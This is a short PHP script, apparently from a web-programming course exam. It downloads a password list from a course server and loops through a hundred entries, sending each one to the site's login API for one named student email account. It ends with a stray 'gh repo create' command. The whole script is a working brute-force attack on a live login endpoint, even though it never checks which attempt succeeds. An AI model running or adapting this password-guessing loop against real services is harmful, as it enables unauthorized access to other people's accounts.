<?php
$url = "http://topicosweb.celaya.tecnm.mx/TopWeb/passwords.txt"; 

$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch); 
curl_close($ch);

//echo "<pre>" .$response. "</pre>"; 

$partes = preg_split('/\s+/', trim($response));
//print_r($partes);
// echo $partes[8];
// die();
$cont = 16500;

do{
$url = "http://topicosweb.celaya.tecnm.mx/TopWeb/public/api/v1/login";
$data = [
    "email" => "l22030642@celaya.tecnm.mx",
    "password"  => $partes[$cont]
];

$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($ch, CURLOPT_POST, true); 
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data)); 
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json", 
    "Accept: application/json"
]);

$response = curl_exec($ch); 
curl_close($ch); 

//echo $response;
$cont++;
}while($cont < 16600);
//echo $response

?>

gh repo create examentw --public --clone